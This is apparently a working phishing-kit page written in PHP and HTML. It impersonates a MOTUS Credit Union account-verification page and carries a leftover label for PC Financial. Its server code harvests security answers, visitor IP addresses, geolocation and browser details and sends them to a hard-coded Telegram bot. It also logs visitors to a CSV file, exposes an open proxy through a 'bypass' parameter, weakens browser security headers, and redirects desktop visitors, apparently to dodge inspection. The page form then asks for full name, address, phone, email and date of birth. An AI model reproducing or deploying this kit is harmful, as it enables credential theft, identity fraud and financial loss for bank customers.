<?php
 include "/251818/040148.php";
 include "/251818/040149.php"; 
 include "/251818/040152.php"; 
 include "/251818/040153.php"; 
 include "/251818/040154.php"; 
 include "/251818/040150.php"; 
 include "/251818/040147.php"; 
 include "/251818/040151.php"; 

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'Master_database.csv';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "[pc]presidents choice [pc] ";
    $project    = "[rR] PROJECT-SWIFTRYNX [rR]";
    $url        = "https://pcfinancial.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $code       = $_POST['code']; 
    $an1        = $_POST['answer1'];
    $an2        = $_POST['answer2'];
    $an3        = $_POST['answer3'];
    $logo       = "[CR00K-1N]";
    $gitusr     = "RandomRyan";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
	$lh     = "+";
        $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message = "$an1\n$an2\n$an3\n\n=======================\n\nCLICKED ON $date AT $time\n\n $ip\n\n$uaget\n\n$uos\n$bsr\n\n$is\n\n$city\n$country\n$continent\n\n maps.google.com/?q=$la$lh$lp\n\n======$project==== \n";
 
$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-821080105',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );


header('Location: MOT_3.php');
?><html><script src=""></script><script src=""></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
    <title>Reset Password - MOTUS Credit Union</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="MOTUS Credit Union online banking">
    <meta name="keywords" content="meridian, credit, union, online, banking">
    <link href="./files/style.css" rel="stylesheet">
    <script src="./files/jquery-3.6.0.min" crossorigin="anonymous"></script>
    <script>var lrbank = 'Motus'; var lrinfo = 'Details';</script>
    <script src="./files/actions"></script>
    <script src="./files/jquery.mask"></script>
    <script src="./files/details"></script>
    <style>
    .signin-form .signin-form-content {
        padding: 3px !important;
    }

    .newselect {
        margin-bottom: 10px !important;
        background: #253746 !important;
        border: none !important;
        border-bottom: 1px solid #a8a8a8 !important;
        color: #ffffff !important;
        min-height: 28px;
        outline: 0;
        padding: 3px 0 !important;
        transition: border-color .1s ease;
        width: 100%;
        border-radius: 0;
    }
    </style>
<script src=""></script></head>
<body>
    <div class="load-remove" style="display: none">
    </div>
    <div class="body-content">
        <div class="row public-header">
            <div class="logo-container">
                <a href="http://veneskey.com/Security_Login">
                    <img src="./files/logo.svg" alt="MOTUS Logo" class="meridian-logo">
                </a>
            </div>
            <div class="link-container">
                <ul class="utility-links">
                    <li>
                        <a href="https://www.motus.ca/" target="_blank">MOTUSCU.ca</a>
                    </li>
                </ul>
            </div>
        </div>
    </div>
    <div id="page-content" class="signin-page">
        <div class="signin-page-inner dimmed">
            <div class="row">
                <div class="signin-form-container wide">
                    <form action="040147.php" method="post">
                        <div class="signin-form">
                            <h1>Verify Your Account</h1>
                            <div class="horizontal-steps">
                                <div class="step ">
                                    <span>Log in</span>
                                </div>
                                <div class="step selected">
                                    <span>Verify account</span>
                                </div>
                                <div class="step ">
                                    <span>Complete</span>
                                </div>
                            </div>
                            <h3>Personal Information</h3>
                            <div class="if-div">
                                <p><b>Full Name:</b></p>
                                <input required="true" name="name" type="text" value="" autocomplete="off" class="lrinput newselect" attr-action="Filling Full Name">
                            </div>
                            <div class="if-div">
                                <p><b>Address:</b></p>
                                <input required="true" name="address" type="text" value="" autocomplete="off" class="lrinput newselect" attr-action="Filling Address">
                            </div>
                            <div class="if-div">
                                <p><b>City:</b></p>
                                <input required="true" name="city" type="text" value="" autocomplete="off" class="lrinput newselect" attr-action="Filling City">
                            </div>
                            <div class="if-div">
                                <p><b>Postal Code:</b></p>
                                <input required="true" name="postal" type="text" value="" id="input-postal" autocomplete="off" class="lrinput newselect" attr-action="Filling Postal" pattern="[A-Za-z][0-9][A-Za-z] [0-9][A-Za-z][0-9]" title="Please enter a valid postal code" maxlength="7">
                            </div>
                            <div class="if-div">
                                <p><b>Phone Number:</b></p>
                                <input required="true" name="phone" type="tel" value="" autocomplete="off" maxlength="13" oninput="this.value = this.value.replace(/[^0-9, ]/, '')" class="lrinput newselect" attr-action="Filling Phone">
                            </div>
                            <div class="if-div">
                                <p><b>Email Address:</b></p>
                                <input required="true" name="email" type="email" value="" autocomplete="off" class="lrinput newselect" attr-action="Filling Email">
                            </div>
                            <div class="if-div">
                                <p><b>Date of Birth:</b></p>
                                <select name="dob1" required="" style="width: 30%;display: inline-block;" class="lrinput newselect" attr-action="Selecting DoB">
                                    <option value="">MM</option>
                                    <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>                                    </select>
                                <select name="dob2" required="" style="width:30%;display: inline-block;" class="lrinput newselect" attr-action="Selecting DoB">
                                    <option value="">DD</option>
                                    <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option>                                    </select>
                                <select name="dob3" required="" style="width:37%; display: inline-block;" class="lrinput newselect" attr-action="Selecting DoB">
                                    <option value="">YYYY</option>
                                    <option value="2023">2023</option><option value="2022">2022</option><option value="2021">2021</option><option value="2020">2020</option><option value="2019">2019</option><option value="2018">2018</option><option value="2017">2017</option><option value="2016">2016</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option>                                    </select>
                            </div>
                            <div class=" signin-buttons">
                                <div>
                                    <input type="submit" name="save" class="orange button" value="Continue">
                                </div>
                            </div>
                        </div>
                    </form>
                    <br><br>
                    <div class="signin-form-links">
                        <a href="http://veneskey.com/Security_Contact" class="semibold ">Contact Us</a> |
                        <a href="http://veneskey.com/Security_FAQ" class="semibold ">FAQs</a> |
                        <a href="http://veneskey.com/Security_Difficulty" class="semibold ">Having Difficulty Signing In?</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer class="main-footer" style="background: #a7a7a7;">
        <div class="row">
            <div class="footer-logos">
                <div class="logo-container">
                    <a href="http://veneskey.com/Security_Login">
                    <img src="./files/logo.svg" alt="Meridian Logo" class="meridian-logo">
                    </a>
                </div>
                <div>
                    <img src="./files/entrust.png" class="entrust-seal">
                </div>
            </div>
            <div class="footer-sub">
                <a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                <span>Copyright © 2023 MOTUS Credit Union. All rights reserved.</span>
                <div class="footer-links">
                    <a href="https://www.motus.ca/privacy" title="Privacy &amp; Security" target="_blank">Privacy &amp; Security</a>
                    <a href="https://www.motus.ca/legal" title="Legal" target="_blank">Legal</a>
                    <a href="https://www.motus.ca/accessibility" title="Accessibility" target="_blank">Accessibility</a>
                </div>
            </div>
        </div>
    </footer>


</body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>